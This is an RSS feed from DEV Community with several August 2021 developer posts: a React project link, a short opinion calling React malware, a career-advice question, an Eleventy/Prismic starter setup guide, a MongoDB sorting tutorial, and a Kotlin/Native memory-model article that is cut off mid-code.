<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>e-commerce React</title>
      <author>Arthur de Sousa</author>
      <pubDate>Sat, 07 Aug 2021 16:38:09 +0000</pubDate>
      <link>https://dev.to/sousa2323/e-commerce-react-33hb</link>
      <guid>https://dev.to/sousa2323/e-commerce-react-33hb</guid>
      <description>&lt;p&gt;&lt;a href="https://github.com/sousa2323/e-commerce-react"&gt;https://github.com/sousa2323/e-commerce-react&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ainda não está pronto e precisa ser ajustado, porém, esse é um dos meus projetos que venho desenvolvido para maior aprendizado sobre React, as imagens são apenas para demonstração.   &lt;/p&gt;

</description>
      <category>react</category>
      <category>javascript</category>
      <category>node</category>
      <category>github</category>
    </item>
    <item>
      <title>Don't Trust Facebook</title>
      <author>Jeff Meyerson</author>
      <pubDate>Sat, 07 Aug 2021 16:25:11 +0000</pubDate>
      <link>https://dev.to/the_prion/don-t-trust-facebook-2pe8</link>
      <guid>https://dev.to/the_prion/don-t-trust-facebook-2pe8</guid>
      <description>&lt;p&gt;React is malware.&lt;/p&gt;

&lt;p&gt;Across every interface, it gives Facebook direct access to everything you see and do.&lt;/p&gt;

&lt;p&gt;&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/sJxqq0NHzK0"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

</description>
      <category>facebook</category>
      <category>power</category>
      <category>abuse</category>
      <category>react</category>
    </item>
    <item>
      <title>What advice would you give to High Schooler thinking of software developer career?</title>
      <author>Clean Code Studio</author>
      <pubDate>Sat, 07 Aug 2021 16:18:44 +0000</pubDate>
      <link>https://dev.to/cleancodestudio/what-advice-would-you-give-to-high-schooler-thinking-of-software-developer-career-3k13</link>
      <guid>https://dev.to/cleancodestudio/what-advice-would-you-give-to-high-schooler-thinking-of-software-developer-career-3k13</guid>
      <description>&lt;div class="ltag__user ltag__user__id__386677"&gt;
  
    .ltag__user__id__386677 .follow-action-button {
      background-color: #339d15 !important;
      color: #ffffff !important;
      border-color: #339d15 !important;
    }
  
    &lt;a href="/cleancodestudio" class="ltag__user__link profile-image-link"&gt;
      &lt;div class="ltag__user__pic"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--iaD-SiIM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--uL9Viyw2--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/386677/50ab5359-8342-4fc0-961a-04bb95957fa1.jpg" alt="cleancodestudio image"&gt;
      &lt;/div&gt;
    &lt;/a&gt;
  &lt;div class="ltag__user__content"&gt;
    &lt;h2&gt;
&lt;a class="ltag__user__link" href="/cleancodestudio"&gt;Clean Code Studio&lt;/a&gt;Follow
&lt;/h2&gt;
    &lt;div class="ltag__user__summary"&gt;
      &lt;a class="ltag__user__link" href="/cleancodestudio"&gt;Clean Code Clean Life ~ Simplify&lt;/a&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;"If a junior in high school were asking for your advice, what&lt;/em&gt;&lt;br&gt;
&lt;em&gt;would you tell them? What tips would you have for going into&lt;/em&gt;&lt;br&gt;
&lt;em&gt;'computer science'?&lt;/em&gt;"&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;(Please comment your tips - asking for real high school kid who stopped me to personally ask for advice)&lt;/p&gt;




&lt;p&gt;&lt;em&gt;"Last night the next door neighbors kid stopped me in the drive way..."&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I was pulling into my parent's drive way - usually swing by my child hood home a couple times month. &lt;/p&gt;

&lt;p&gt;Last night when I pulled into the drive way I heard &lt;/p&gt;




&lt;p&gt;&lt;em&gt;"Hey!!! Is that Zak?"&lt;/em&gt;&lt;/p&gt;




&lt;p&gt;It was, I'm Zak, I'm a software engineer - and I have been for over half a decade. I never went to college and make a great living. My child hood neighbors kid who is about a decade younger than me knows this. &lt;/p&gt;

&lt;p&gt;He wanted advice about going into the computer science field. &lt;/p&gt;

&lt;p&gt;Before I had time to process what I was saying I spat out, "Well, I don't recommend college." &lt;/p&gt;

&lt;p&gt;Looking back to last night, I'm not confident that was the best initial piece of advice to go with - but hey, I wasn't prepared. &lt;/p&gt;

&lt;p&gt;I decided to take a pause, asked for his number and email, and told him that I'd think on it and get get him some solid tips by mid next week. &lt;/p&gt;




&lt;p&gt;If a junior in high school were asking for your advice, what would you tell them? What tips would you have?&lt;/p&gt;

&lt;p&gt;This kid is smart and as far as I can tell has the makings and characteristics to be a software engineer...I just want to make sure I'm providing the best, most non-bias advice I'm able to.&lt;/p&gt;

&lt;p&gt;With that, any tips and advice you can offer up - I'll make sure to pass along to Stevie.&lt;/p&gt;

</description>
      <category>programming</category>
      <category>discuss</category>
      <category>help</category>
      <category>career</category>
    </item>
    <item>
      <title>Eleventy Soft UI - Powered by Prismic CMS</title>
      <author>Sm0ke</author>
      <pubDate>Sat, 07 Aug 2021 16:01:24 +0000</pubDate>
      <link>https://dev.to/sm0ke/eleventy-soft-ui-powered-by-prismic-cms-4eei</link>
      <guid>https://dev.to/sm0ke/eleventy-soft-ui-powered-by-prismic-cms-4eei</guid>
      <description>&lt;p&gt;Hello coders,&lt;/p&gt;

&lt;p&gt;This article presents an open-source starter built in &lt;strong&gt;Eleventy&lt;/strong&gt; and &lt;strong&gt;Prismic CMS&lt;/strong&gt; on top of a modern Bootstrap 5 design: &lt;a href="https://appseed.us/product/eleventy-soft-ui"&gt;Soft UI Design&lt;/a&gt;. The product can be used to code much faster presentation websites or personal blogs. For newcomers, &lt;strong&gt;Eleventy&lt;/strong&gt; is a lightweight static-site generator and &lt;strong&gt;Prismic CMS&lt;/strong&gt; provides a headless blog service.   &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Thanks for reading!&lt;/em&gt; - Content provided by &lt;strong&gt;&lt;a href="https://appseed.us/"&gt;App Generator&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;/blockquote&gt;




&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://appseed.us/product/eleventy-soft-ui"&gt;Eleventy Soft UI&lt;/a&gt; - product page&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://eleventy-soft-ui.appseed-srv1.com/"&gt;Eleventy Soft UI&lt;/a&gt; - LIVE Demo&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://eleventy-soft-ui.appseed-srv1.com/blog/about/"&gt;Eleventy Soft UI _blog&lt;/a&gt; - Page pulled from Prismic&lt;/li&gt;
&lt;/ul&gt;




&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--FDxhU2aK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/guwdqi549lwqkvsydphc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--FDxhU2aK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/guwdqi549lwqkvsydphc.png" alt="Eleventy Soft UI - Open-source static site powered by 11ty, Prismic and AppSeed."&gt;&lt;/a&gt;&lt;/p&gt;




&lt;p&gt;To use the product a decent Nodejs version should be installed in the workstation and (optionally) a &lt;a href="https://prismic.io/"&gt;Prismic&lt;/a&gt; account (free tier available). &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The problem that starter solves&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Static sites are great to code simple pages and presentation sites .. but for blogs developers should use a Markdown to Html translation to edit their content. Prismic help us with this part and empower the developer to edit and format the content visually. &lt;/p&gt;




&lt;blockquote&gt;
&lt;p&gt;How it works &lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Step #1&lt;/strong&gt; - Add your content in Prismic CMS&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Step #2&lt;/strong&gt; - Configure the starter to consume the Prismic Content&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Step #3&lt;/strong&gt; - Install dependencies and start the project&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Step #4&lt;/strong&gt; - Built for production &lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;




&lt;p&gt;Once all steps are completed, &lt;strong&gt;Soft UI 11ty&lt;/strong&gt; should be up and running in the browser will all Prismic articles pulled locally.&lt;/p&gt;




&lt;blockquote&gt;
&lt;p&gt;11ty Soft UI - Team Section&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--UNGq4U9q--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5w4nrjhqnvft0higq00e.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UNGq4U9q--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5w4nrjhqnvft0higq00e.png" alt="11ty Soft UI - User profile Page, provided by Eleventy, Prismic and AppSeed."&gt;&lt;/a&gt;&lt;/p&gt;




&lt;blockquote&gt;
&lt;p&gt;11ty Soft UI - Contact Footer&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--lVqZZzPu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pjrhfqz5of77mquemh62.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--lVqZZzPu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pjrhfqz5of77mquemh62.png" alt="11ty Soft UI - Fancy footer, provided by Eleventy, Prismic and AppSeed."&gt;&lt;/a&gt;&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#lets-build-the-product"&gt;
  &lt;/a&gt;
  Let's build the product
&lt;/h2&gt;

&lt;p&gt;For full instructions please access the &lt;strong&gt;&lt;a href="https://appseed.us/product/eleventy-soft-ui"&gt;product page&lt;/a&gt;&lt;/strong&gt; (docs section).  &lt;/p&gt;




&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Step #1&lt;/strong&gt; - Clone this repository&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;git clone https://github.com/app-generator/eleventy-soft-ui-design.git
&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;cd &lt;/span&gt;eleventy-soft-ui-design 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Step #2&lt;/strong&gt; - Install modules via NPM or Yarn&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;npm i
// OR
&lt;span class="nv"&gt;$ &lt;/span&gt;yarn
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Step #3&lt;/strong&gt; - Configure &lt;a href="http://prismic.io/"&gt;Prismic&lt;/a&gt; API Node&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Rename &lt;code&gt;.env.sample&lt;/code&gt; to &lt;code&gt;.env&lt;/code&gt; and specify the &lt;code&gt;PRISMIC_REPOSITORY_NAME&lt;/code&gt;. In case you are not familiar with &lt;code&gt;Prismic&lt;/code&gt;, feel free to use the &lt;code&gt;DEMO API&lt;/code&gt; provided by AppSeed: &lt;code&gt;https://eleventy-soft-ui-design.prismic.io/api/v2&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;PRISMIC_REPOSITORY_NAME=YOUR_PRISMIC_API_URL
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Step #4&lt;/strong&gt; - Start project in development mode&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;yarn start
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Once the project is compiled and the content is pulled from &lt;code&gt;Prismic&lt;/code&gt;, the project can be visited in the browser: &lt;code&gt;http://localhost:8080&lt;/code&gt;.&lt;/p&gt;




&lt;p&gt;From this point the starter can be used to code simple websites and personal blogs using a modern stack and a pixel-perfect UI crafted by &lt;strong&gt;Creative-Tim&lt;/strong&gt;.&lt;/p&gt;




&lt;blockquote&gt;
&lt;p&gt;Thanks for reading! For more resources please access:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://www.11ty.dev/"&gt;11ty&lt;/a&gt; - the official website&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://prismic.io/"&gt;Prismic CMS&lt;/a&gt; - official website&lt;/li&gt;
&lt;li&gt;More &lt;a href="https://appseed.us/static-site"&gt;static staters&lt;/a&gt; provided by &lt;strong&gt;AppSeed&lt;/strong&gt; &lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>webdev</category>
      <category>eleventy</category>
      <category>prismic</category>
      <category>softui</category>
    </item>
    <item>
      <title>How to sort the results of a MongoDB query</title>
      <author>Donald Feury</author>
      <pubDate>Sat, 07 Aug 2021 16:00:38 +0000</pubDate>
      <link>https://dev.to/dak425/how-to-sort-the-results-of-a-mongodb-query-2d5e</link>
      <guid>https://dev.to/dak425/how-to-sort-the-results-of-a-mongodb-query-2d5e</guid>
      <description>&lt;p&gt;For a full overview of MongoDB and all my posts on it, check out my &lt;a href="https://donaldfeury.xyz/introduction-to-mongodb/"&gt;overview&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;After using the &lt;a href="https://donaldfeury.xyz/get-all-the-documents-out-of-a-collection-in-mongodb/"&gt;find method to get retrieve some documents from MongoDB&lt;/a&gt; and further &lt;a href="https://donaldfeury.xyz/how-to-retrieve-specific-documents-from-mongodb-using-filters/"&gt;trimming down that result using filters&lt;/a&gt;, there may still be a lot of data. It may be easier to work with the data if is it sorted using the &lt;code&gt;sort&lt;/code&gt; method.&lt;/p&gt;

&lt;p&gt;Much like how a user can &lt;a href="https://donaldfeury.xyz/use-the-limit-method-to-retrieve-a-specific-number-of-documents-from-mongodb/"&gt;modify the result of a query by chaining something like the limit method&lt;/a&gt;, you can use chain the &lt;code&gt;sort&lt;/code&gt; method to the result of another method that returns a result, such as &lt;code&gt;find&lt;/code&gt; or &lt;code&gt;limit&lt;/code&gt;, to get that data into a specific order.&lt;/p&gt;

&lt;p&gt;With the following data set in a collection called &lt;code&gt;users&lt;/code&gt;:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
    "name": "John Doe",
    "email": "test@test.com",
    "admin": false,
    "dateJoined": ISODate("2021-02-01")
},
{
    "name": "Jane Doe",
    "email": "test2@test2.com",
    "admin": false,
    "dateJoined": ISODate("2021-03-01")
},
{
    "name": "Bob Doe",
    "email": "bob@bob.com",
    "admin": true,
    "dateJoined": ISODate("2021-01-01")
},
{
    "name": "Your Mom",
    "email": "koolkid@someplace.com",
    "admin": false,
    "dateJoined": ISODate("2020-12-01")
}

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To pull all the documents out sorted by the date they joined in ascending order, we would do the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;db.users.find().sort({dateJoined: 1})

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Notice that &lt;code&gt;sort&lt;/code&gt; takes an argument of an object describing how to sort the data. Each field in the object can have a value of 1 (ascending) or -1 (descending)&lt;/p&gt;

&lt;p&gt;This will get us the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
    "name": "Your Mom",
    "email": "koolkid@someplace.com",
    "admin": false,
    "dateJoined": ISODate("2020-12-01")
},
{
    "name": "Bob Doe",
    "email": "bob@bob.com",
    "admin": true,
    "dateJoined": ISODate("2021-01-01")
},
{
    "name": "John Doe",
    "email": "test@test.com",
    "admin": false,
    "dateJoined": ISODate("2021-02-01")
},
{
    "name": "Jane Doe",
    "email": "test2@test2.com",
    "admin": false,
    "dateJoined": ISODate("2021-03-01")
}

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Sorting on multiple fields can be done as well&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;db.users.find().sort({admin: 1, name -1})

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will return the documents first sorted in ascending order by &lt;code&gt;admin&lt;/code&gt;, then sorted in descending order by &lt;code&gt;name&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
    "name": "Jane Doe",
    "email": "test2@test2.com",
    "admin": false,
    "dateJoined": ISODate("2021-03-01")
},
{
    "name": "John Doe",
    "email": "test@test.com",
    "admin": false,
    "dateJoined": ISODate("2021-02-01")
},
{
    "name": "Your Mom",
    "email": "koolkid@someplace.com",
    "admin": false,
    "dateJoined": ISODate("2020-12-01")
},
{
    "name": "Bob Doe",
    "email": "bob@bob.com",
    "admin": true,
    "dateJoined": ISODate("2021-01-01")
}

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>mongodb</category>
    </item>
    <item>
      <title>Trying out the experimental new Kotlin/Native memory model</title>
      <author>Russell Wolf</author>
      <pubDate>Sat, 07 Aug 2021 15:54:36 +0000</pubDate>
      <link>https://dev.to/touchlab/trying-out-the-experimental-new-kotlin-native-memory-model-235k</link>
      <guid>https://dev.to/touchlab/trying-out-the-experimental-new-kotlin-native-memory-model-235k</guid>
      <description>&lt;p&gt;&lt;em&gt;Photo by &lt;a href="https://unsplash.com/@victorserban?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText"&gt;Victor Serban&lt;/a&gt; on &lt;a href="https://unsplash.com/?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText"&gt;Unsplash&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;If you've been following Kotlin/Native at all over the last couple of years, you'll know that it's memory model has been controversial. Last year, the Kotlin team &lt;a href="https://blog.jetbrains.com/kotlin/2020/07/kotlin-native-memory-management-roadmap/"&gt;committed to redesigning it&lt;/a&gt;, and this year they &lt;a href="https://blog.jetbrains.com/kotlin/2021/05/kotlin-native-memory-management-update/"&gt;promised a preview&lt;/a&gt; by the end of the summer. Well, there hasn't been an official announcement yet, but that preview is present in the Kotlin 1.5.30-M1 early-access release.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#tldr"&gt;
  &lt;/a&gt;
  TL,DR
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;Update your Kotlin version to 1.5.30-M1&lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;kotlinOptions.freeCompilerArgs += listOf("-memory-model", "experimental")&lt;/code&gt; to your Kotlin/Native compilations&lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;kotlin.native.cacheKind=none&lt;/code&gt; to &lt;code&gt;gradle.properties&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;Mutate unfrozen objects from different threads&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#wait-what"&gt;
  &lt;/a&gt;
  Wait, what?!
&lt;/h2&gt;

&lt;p&gt;Yup! The memory model is controlled with the &lt;code&gt;-memory-model&lt;/code&gt; command-line flag. Pass &lt;code&gt;experimental&lt;/code&gt; for the new model or &lt;code&gt;strict&lt;/code&gt; for the existing one&lt;sup&gt;*&lt;/sup&gt;. Due to current limitations, you also need to disable compiler caching with the &lt;code&gt;kotlin.native.cacheKind=none&lt;/code&gt; gradle property.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;sup&gt;*&lt;/sup&gt;You can also pass &lt;code&gt;relaxed&lt;/code&gt;, but it's probably not a good idea.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;You can pass the flag to all your Kotlin/Native targets by doing something like this from Gradle:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight kotlin"&gt;&lt;code&gt;&lt;span class="nf"&gt;kotlin&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;targets&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;withType&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;KotlinNativeTarget&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;().&lt;/span&gt;&lt;span class="nf"&gt;all&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;compilations&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;all&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;kotlinOptions&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;freeCompilerArgs&lt;/span&gt; &lt;span class="p"&gt;+=&lt;/span&gt; 
                &lt;span class="nf"&gt;listOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"-memory-model"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"experimental"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now you can freely mutate unfrozen state across threads. Let's see what that looks like.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#testing-the-two-models"&gt;
  &lt;/a&gt;
  Testing the two models
&lt;/h2&gt;

&lt;p&gt;In the current strict memory model, if you wanted to write a function to run code in a background thread, it might look something like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight kotlin"&gt;&lt;code&gt;&lt;span class="k"&gt;fun&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;T&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;doInBackground&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nc"&gt;T&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="nc"&gt;T&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;val&lt;/span&gt; &lt;span class="py"&gt;worker&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Worker&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="kd"&gt;val&lt;/span&gt; &lt;span class="py"&gt;future&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;worker&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="nc"&gt;TransferMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;SAFE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
        &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;freeze&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt; 
        &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nf"&gt;it&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;future&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The function takes a lambda, freezes it, and executes it in a new &lt;code&gt;Worker&lt;/code&gt; which runs on a background thread. Because the lambda is frozen, the only way we can have mutable state is by using atomics, as in the following test (which can run on the &lt;code&gt;iosX64&lt;/code&gt; target)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight kotlin"&gt;&lt;code&gt;&lt;span class="nd"&gt;@Test&lt;/span&gt; &lt;span class="k"&gt;fun&lt;/span&gt; &lt;span class="nf"&gt;oldMemoryTest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;val&lt;/span&gt; &lt;span class="py"&gt;didRunLambda&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;AtomicReference&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nf"&gt;assertTrue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;NSThread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isMainThread&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nf"&gt;doInBackground&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;didRunLambda&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;
        &lt;span class="nf"&gt;assertFalse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;NSThread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isMainThread&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nf"&gt;assertTrue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;didRunLambda&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we initialize an atomic boolean to false on the main thread, mutate it to true on a background thread, and assert that it's true from the main thread.&lt;/p&gt;

&lt;p&gt;Code like the above is the primary way of handling mutable state across threads in the current memory model (although it's usually hidden deep in the machinery of a library like &lt;code&gt;kotlinx.coroutines&lt;/code&gt;), and it still works in the experimental model. But we can also do new things we coudln't do before. &lt;/p&gt;

&lt;p&gt;We might naively expect that the new model will just let us drop the atomic and do something like the following&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight kotlin"&gt;&lt;code&gt;&lt;span class="nd"&gt;@Test&lt;/span&gt; &lt;span class="k"&gt;fun&lt;/span&gt; &lt;span class="nf"&gt;newMemoryTest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
